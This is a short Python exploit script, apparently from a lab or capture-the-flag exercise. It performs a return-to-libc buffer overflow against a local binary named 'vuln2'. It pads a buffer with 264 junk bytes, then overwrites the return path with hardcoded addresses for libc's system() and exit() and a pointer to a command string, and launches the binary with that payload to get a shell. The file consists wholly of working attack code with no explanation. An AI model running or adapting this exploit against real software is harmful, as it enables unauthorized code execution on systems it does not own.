import struct
import subprocess

libc = 0xb7dd8000
system = libc + 0x00044630
exit = libc + 0x000373a0
sys_arg = 0xb7f60406

buf = "B" * 264		# Junk
buf += struct.pack("<I",system)
buf += struct.pack("<I",exit)
buf += struct.pack("<I",sys_arg)

subprocess.call(["./vuln2", buf])
